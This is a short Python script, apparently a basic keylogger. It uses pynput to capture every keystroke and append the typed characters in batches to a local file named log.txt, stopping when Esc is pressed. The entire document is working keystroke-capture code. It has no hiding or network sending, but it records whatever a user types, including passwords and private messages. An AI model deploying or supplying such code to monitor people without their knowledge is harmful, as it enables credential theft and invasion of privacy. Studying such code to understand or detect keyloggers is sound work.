from pynput import keyboard

count = 0
keys = []


def write_file(input_keys):
    """Writes the pressed keys to a log file."""
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in input_keys:
            k = str(key).replace("'", "")

            if k.find("space") > 0:
                f.write("\n")

            elif k.find("Key") == -1:
                f.write(k)


def on_press(key):
    """Handles the key press event by appending the key to a global list."""
    global keys, count

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    """Handles the key release event, specifically looking for the 'esc' key."""
    if key == keyboard.Key.esc:
        return False

    return True


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
